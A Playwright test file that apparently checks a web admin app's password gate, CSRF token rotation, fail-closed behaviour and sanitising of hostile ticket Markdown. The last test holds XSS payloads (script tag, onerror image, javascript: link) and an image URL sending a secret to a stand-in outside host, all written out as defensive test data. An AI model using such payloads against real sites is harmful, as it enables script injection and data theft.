import { test, expect } from "./fixtures";

test("access gate hides business data, rotates CSRF after login and clears the view on logout", async ({ page }) => {
  let authenticated = false;
  let token = "bootstrap-csrf";
  const passwords: unknown[] = [];
  await page.route("**/api/access/session", (route) => route.fulfill({ json: { mode: "password", authenticated, csrf_token: token, expires_at: authenticated ? new Date(Date.now() + 60000).toISOString() : null } }));
  await page.route("**/api/access/login", (route) => {
    expect(route.request().headers()["x-csrftoken"]).toBe("bootstrap-csrf");
    passwords.push(route.request().postDataJSON());
    authenticated = true; token = "rotated-csrf";
    return route.fulfill({ json: { authenticated } });
  });
  await page.route("**/api/access/logout", (route) => {
    expect(route.request().headers()["x-csrftoken"]).toBe("rotated-csrf");
    authenticated = false; token = "signed-out-csrf";
    return route.fulfill({ json: { authenticated } });
  });
  await page.route("**/api/environments", (route) => route.fulfill({ json: [] }));
  await page.route("**/api/requests", (route) => route.fulfill({ json: [] }));
  await page.route("**/api/queue", (route) => route.fulfill({ json: [] }));
  await page.goto("/admin");
  await page.getByRole("combobox").selectOption("en");
  await expect(page.getByRole("heading", { name: "AI & Agents", exact: true })).toHaveCount(0);
  await expect(page.getByRole("navigation")).toHaveCount(0);
  await page.getByLabel("Instance password", { exact: true }).fill("fixture-team-access-password");
  await page.getByRole("button", { name: "Sign in", exact: true }).click();
  await expect(page.getByRole("heading", { name: "AI & Agents", exact: true })).toBeVisible();
  expect(passwords).toEqual([{ password: "fixture-team-access-password" }]);
  expect(await page.evaluate(() => JSON.stringify(localStorage))).not.toContain("fixture-team-access-password");
  await page.getByRole("button", { name: "Sign out", exact: true }).click();
  await expect(page.getByLabel("Instance password", { exact: true })).toBeVisible();
  await expect(page.getByRole("heading", { name: "AI & Agents", exact: true })).toHaveCount(0);
});

test("unconfigured exposed instance fails closed and offers retry without mounting administration", async ({ page }) => {
  await page.route("**/api/access/session", (route) => route.fulfill({ status: 503, json: { mode: "unconfigured", authenticated: false } }));
  await page.goto("/admin");
  await page.getByRole("combobox").selectOption("en");
  await expect(page.getByRole("main").getByRole("alert")).toContainText("Instance access is unavailable");
  await expect(page.getByRole("navigation")).toHaveCount(0);
  await expect(page.getByRole("button", { name: "Retry", exact: true })).toBeVisible();
});

test("hostile ticket Markdown cannot execute scripts, unsafe links or remote images", async ({ page }) => {
  const id = "19191919-1919-4919-8919-191919191919";
  const content = "# Untrusted data\n\n<script>window.compromised=true</script>\n<img src=x onerror=window.compromised=true>\n[click](javascript:window.compromised=true)\n![tracking](https://outside.example.test/collect?private=secret)\n\nSafe explanation.";
  const requests: string[] = [];
  await page.route("https://outside.example.test/**", (route) => { requests.push(route.request().url()); return route.abort(); });
  await page.route("**/api/queue", route=>route.fulfill({json:[]}));
  await page.route(`**/api/analyses/${id}`, route=>route.fulfill({json:{id,title:"Hostile source",need:"Explain the source",workflow:"question",status:"DISCUSSING",conversation_state:"DISCUSSION",created_at:"2026-11-06T00:00:00Z",analysis_protocol:"2.4",baseline:[],database:{},attachments:[],progress:[],questions:[],conversation:[],versions:[],latest_version:null,decisions:[],decision_history:[],analysis_runs:[],publications:[],messages:[{id:1,role:"assistant",kind:"discussion_reply",content,created_at:"2026-11-06T00:00:00Z"}],discussion:{enabled:true,mode:"discussion",revision:1,job:null}}}));
  await page.goto(`/analyses/${id}`);
  const rendered=page.locator('.conversation-answer');
  await expect(rendered).toContainText("Safe explanation.");
  await expect(rendered.locator("script,img,[onerror],a[href^='javascript:']")).toHaveCount(0);
  expect(await page.evaluate(() => (window as Window & { compromised?: boolean }).compromised)).toBeUndefined();
  expect(requests).toEqual([]);
});
